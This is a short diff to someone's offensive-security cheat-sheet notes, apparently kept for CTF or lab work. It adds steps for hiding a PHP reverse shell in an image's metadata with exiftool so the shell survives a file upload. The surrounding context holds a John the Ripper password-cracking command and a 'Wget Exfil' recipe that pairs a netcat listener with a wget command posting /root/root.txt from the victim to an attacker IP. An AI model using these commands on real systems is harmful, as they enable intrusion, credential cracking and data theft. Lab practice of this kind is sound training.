@@ -131,6 +131,10 @@ Enum Notes:
 John: 
 	- john --worldlist=rockyou.txt <hash file>
 		- john --show <hash file>
+Exiftool: How to hide php shell within an image
+	- sudo apt update && apt upgrade -y 
+	- sudo apt install exiftool -y
+	- exiftool -Comment="$(< rev.php)" <image file that will be uploaded>
 Wget Exfil:
 	- On your machine: nc -lnvp 80
 	- On victim: wget --post-file=/root/root.txt <attacker IP>
